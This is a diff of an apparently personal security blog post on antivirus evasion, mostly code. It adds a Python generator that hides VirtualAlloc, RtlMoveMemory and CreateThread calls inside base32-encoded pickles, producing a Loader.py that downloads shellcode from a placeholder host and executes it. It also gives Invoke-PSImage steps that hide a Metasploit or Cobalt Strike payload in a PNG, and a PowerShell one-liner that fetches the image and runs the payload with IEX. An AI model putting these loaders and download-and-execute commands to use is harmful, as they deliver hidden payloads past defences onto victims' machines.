class="string">e_handle = &quot;&#123;&#125;&quot;</span></span><br><span class="line"><span class="string">handle = cPickle.loads(base64.b32decode(e_handle))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">e_run = &quot;&#123;&#125;&quot;</span></span><br><span class="line"><span class="string">cPickle.loads(base64.b32decode(e_run))&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(enb32_shellcode, enb32_vir, enb32_rtl, enb32_handle, enb32_run)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;Loader.py&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(output)</span><br><span class="line">        f.close()</span><br></pre></td></tr></table></figure>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes,cPickle,base64,urllib2</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test1</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">            <span class="keyword">return</span>(<span class="built_in">eval</span>,(<span class="string">&quot;urllib2.urlopen(&#x27;http://x.x.x.x/xxx&#x27;).read().decode(&#x27;hex&#x27;)&quot;</span>,))</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test2</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, shellcode</span>):</span><br><span class="line">            <span class="variable language_">self</span>.shellcode = shellcode</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">            <span class="keyword">return</span>(<span class="built_in">eval</span>,(<span class="string">&quot;ctypes.windll.kernel32.VirtualAlloc(0,len(shellcode),0x1000,0x40)&quot;</span>,))</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test3</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, rwxpage, shellcode</span>):</span><br><span class="line">            <span class="variable language_">self</span>.rwxpage = rwxpage</span><br><span class="line">            <span class="variable language_">self</span>.shellcode = shellcode</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">            <span class="keyword">return</span>(<span class="built_in">eval</span>,(<span class="string">&quot;ctypes.windll.kernel32.RtlMoveMemory(rwxpage,ctypes.create_string_buffer(shellcode),len(shellcode))&quot;</span>,))</span><br><span class="line">       </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test4</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, rwxpage</span>):</span><br><span class="line">            <span class="variable language_">self</span>.rwxpage = rwxpage</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">            <span class="keyword">return</span>(<span class="built_in">eval</span>,(<span class="string">&quot;ctypes.windll.kernel32.CreateThread(0,0,rwxpage,0,0,0)&quot;</span>,))</span><br><span class="line">            </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test5</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, handle</span>):</span><br><span class="line">            <span class="variable language_">self</span>.handle = handle</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">            <span class="keyword">return</span>(<span class="built_in">eval</span>,(<span class="string">&quot;ctypes.windll.kernel32.WaitForSingleObject(handle,-1)&quot;</span>,))</span><br><span class="line">            </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    raw_shellcode = test1()</span><br><span class="line">    ser_shellcode = cPickle.dumps(raw_shellcode)</span><br><span class="line">    enb32_shellcode = base64.b32encode(ser_shellcode)</span><br><span class="line">    shellcode = cPickle.loads(base64.b32decode(enb32_shellcode))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    raw_vir = test2(shellcode)</span><br><span class="line">    ser_vir = cPickle.dumps(raw_vir)</span><br><span class="line">    enb32_vir = base64.b32encode(ser_vir)</span><br><span class="line">    rwxpage = cPickle.loads(base64.b32decode(enb32_vir))</span><br><span class="line"></span><br><span class="line">      </span><br><span class="line">    raw_rtl = test3(rwxpage, shellcode)</span><br><span class="line">    ser_rtl = cPickle.dumps(raw_rtl)</span><br><span class="line">    enb32_rtl = base64.b32encode(ser_rtl)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    raw_handle=test4(rwxpage)</span><br><span class="line">    ser_handle = cPickle.dumps(raw_handle)</span><br><span class="line">    enb32_handle = base64.b32encode(ser_handle)</span><br><span class="line">    handle = cPickle.loads(base64.b32decode(enb32_handle))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    raw_run = test5(handle)</span><br><span class="line">    ser_run = cPickle.dumps(raw_run)</span><br><span class="line">    enb32_run = base64.b32encode(ser_run)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    output = <span class="string">&#x27;&#x27;&#x27;import ctypes,cPickle,base64,urllib2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">e_shellcode = &quot;&#123;&#125;&quot;</span></span><br><span class="line"><span class="string">shellcode = cPickle.loads(base64.b32decode(e_shellcode))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">e_rwxpage=&quot;&#123;&#125;&quot;</span></span><br><span class="line"><span class="string">rwxpage = cPickle.loads(base64.b32decode(e_rwxpage))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">e_code = &quot;&#123;&#125;&quot;</span></span><br><span class="line"><span class="string">cPickle.loads(base64.b32decode(e_code))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">e_handle = &quot;&#123;&#125;&quot;</span></span><br><span class="line"><span class="string">handle = cPickle.loads(base64.b32decode(e_handle))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">e_run = &quot;&#123;&#125;&quot;</span></span><br><span class="line"><span class="string">cPickle.loads(base64.b32decode(e_run))&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(enb32_shellcode, enb32_vir, enb32_rtl, enb32_handle, enb32_run)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;Loader.py&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(output)</span><br><span class="line">        f.close()</span><br></pre></td></tr></table></figure>
 <p>Then we get a <code>Loader.py</code> and use <code>pyinstaller</code> to pack it.</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ PyInstaller --noconsole --onefile Loader.py</span><br></pre></td></tr></table></figure>
 
@@ -518,8 +546,14 @@
 <p>Proj2: <a class="link"   target="_blank" rel="noopener" href="https://github.com/peewpw/Invoke-PSImage" >Invoke-PSImage<i class="fas fa-external-link-alt"></i></a></p>
 <ul>
 <li>Generate payload.ps1 by MSF&#x2F;CS and put it in <code>Invoke-PSImage</code> folder</li>
-<li>Generate shell.png:<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ExecutionPolicy</span> Unrestricted <span class="literal">-Scope</span> CurrentUser</span><br><span class="line"><span class="built_in">Import-Module</span> .\<span class="built_in">Invoke-PSimage</span>.ps1</span><br><span class="line"><span class="built_in">Invoke-PSImage</span> <span class="literal">-Script</span> .\payload.ps1 <span class="literal">-Image</span> .\origin.jpg <span class="literal">-Out</span> .\shell.png <span class="literal">-Web</span></span><br></pre></td></tr></table></figure></li>
-<li>Get a line of code to invoke the shell:<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sal</span> a <span class="built_in">New-Object</span>;<span class="built_in">Add-Type</span> <span class="literal">-A</span> System.Drawing;<span class="variable">$g</span>=a System.Drawing.Bitmap((a Net.WebClient).OpenRead(<span class="string">&quot;http://example.com/shell.png&quot;</span>));<span class="variable">$o</span>=a Byte[] <span class="number">5120</span>;(<span class="number">0</span>..<span class="number">1</span>)|%&#123;<span class="keyword">foreach</span>(<span class="variable">$x</span> <span class="keyword">in</span>(<span class="number">0</span>..<span class="number">2559</span>))&#123;<span class="variable">$p</span>=<span class="variable">$g</span>.GetPixel(<span class="variable">$x</span>,<span class="variable">$_</span>);<span class="variable">$o</span>[<span class="variable">$_</span>*<span class="number">2560</span>+<span class="variable">$x</span>]=([<span class="type">math</span>]::Floor((<span class="variable">$p</span>.B<span class="literal">-band15</span>)*<span class="number">16</span>)<span class="operator">-bor</span>(<span class="variable">$p</span>.G <span class="operator">-band</span> <span class="number">15</span>))&#125;&#125;;<span class="built_in">IEX</span>([<span class="type">System.Text.Encoding</span>]::ASCII.GetString(<span class="variable">$o</span>[<span class="number">0</span><span class="type">..3550</span>]))</span><br></pre></td></tr></table></figure></li>
+<li>Generate shell.png:</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ExecutionPolicy</span> Unrestricted <span class="literal">-Scope</span> CurrentUser</span><br><span class="line"><span class="built_in">Import-Module</span> .\<span class="built_in">Invoke-PSimage</span>.ps1</span><br><span class="line"><span class="built_in">Invoke-PSImage</span> <span class="literal">-Script</span> .\payload.ps1 <span class="literal">-Image</span> .\origin.jpg <span class="literal">-Out</span> .\shell.png <span class="literal">-Web</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>Get a line of code to invoke the shell:</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sal</span> a <span class="built_in">New-Object</span>;<span class="built_in">Add-Type</span> <span class="literal">-A</span> System.Drawing;<span class="variable">$g</span>=a System.Drawing.Bitmap((a Net.WebClient).OpenRead(<span class="string">&quot;http://example.com/shell.png&quot;</span>));<span class="variable">$o</span>=a Byte[] <span class="number">5120</span>;(<span class="number">0</span>..<span class="number">1</span>)|%&#123;<span class="keyword">foreach</span>(<span class="variable">$x</span> <span class="keyword">in</span>(<span class="number">0</span>..<span class="number">2559</span>))&#123;<span class="variable">$p</span>=<span class="variable">$g</span>.GetPixel(<span class="variable">$x</span>,<span class="variable">$_</span>);<span class="variable">$o</span>[<span class="variable">$_</span>*<span class="number">2560</span>+<span class="variable">$x</span>]=([<span class="type">math</span>]::Floor((<span class="variable">$p</span>.B<span class="literal">-band15</span>)*<span class="number">16</span>)<span class="operator">-bor</span>(<span class="variable">$p</span>.G <span class="operator">-band</span> <span class="number">15</span>))&#125;&#125;;<span class="built_in">IEX</span>([<span class="type">System.Text.Encoding</span>]::ASCII.GetString(<span class="variable">$o</span>[<span class="number">0</span><span class="type">..3550</span>]))</span><br></pre></td></tr></table></figure>
+<ul>
 <li>Loader-Shellcode structure is also recommended. You can compile the powershell above to a PE file, and use SFX, RLO, …</li>
 </ul>
 <h2 id="Addition"><a href="#Addition" class="headerlink" title="Addition"></a>Addition</h2><p>Bypass tools:</p>
@@ -545,7 +579,9 @@
 <li><a class="link"   target="_blank" rel="noopener" href="http://bypass.tidesec.com/" >TideBypass<i class="fas fa-external-link-alt"></i></a></li>
 </ul>
 
+                    
                 </div>
+
                 
 
                 <div class="post-bottom-tags-and-share border-box">
@@ -647,29 +683,25 @@
         <div class="page-main-content-bottom border-box">
             
 <footer class="footer border-box">
-    <div class="border-box website-info-box default">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2026
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">TyeYeah</a>
         
-            <div class="copyright-info info-item default">
-                &copy;&nbsp;<span>2018</span>&nbsp;-&nbsp;2025
-                
-                    &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">TyeYeah</a>
-                
-            </div>
+    </div>
 
-            <div class="theme-info info-item default">
-                Powered by&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;&&nbsp;Theme&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
-            </div>
+    <div class="theme-info info-item">
+        Powered by&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;&&nbsp;Theme&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
 
+    
+
+    
+        <div class="count-info info-item">
             
-
-            
-        
-
-        <div class="count-item info-item default">
-            
-                <span class="count-box border-box word">
+                <span class="count-item border-box word">
                     <span class="item-type border-box">Total words</span>
-                    <span class="item-value border-box word">137k</span>
+                    <span class="item-value border-box word">137.1k</span>
                 </span>
             
 
@@ -677,7 +709,9 @@
 
             
         </div>
-    </div>
+    
+
+    
 </footer>
 
         </div>
@@ -687,7 +721,10 @@
     
         <div class="post-tools right-toc">
             <div class="post-tools-container border-box">
-    <ul class="tools-list border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
         <!-- PC TOC show toggle -->
         
             <li class="tools-item flex-center toggle-show-toc">
@@ -720,13 +757,17 @@
             <i class="fas fa-search-minus"></i>
         </li>
 
-        <li class="tools-item tool-toggle-theme-mode flex-center">
-            <i class="fas fa-moon"></i>
-        </li>
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
 
         <!-- rss -->
         
 
+        <!-- to bottom -->
         <li class="tools-item tool-scroll-to-bottom flex-center">
             <i class="fas fa-arrow-down"></i>
         </li>
@@ -809,7 +850,9 @@
 
 
 
-<!-- common -->
+
+
+<!-- common js -->
 
 <script src="/js/utils.js"></script>
 
@@ -826,7 +869,7 @@
 <script src="/js/libs/anime.min.js"></script>
 
 
-<!-- local-search -->
+<!-- local search -->
 
     
 <script src="/js/local-search.js"></script>
@@ -837,6 +880,10 @@
 
 
 <div class="">
+    <!-- home page -->
+    
+
+    <!-- post page -->
     
         <!-- post-helper -->
         
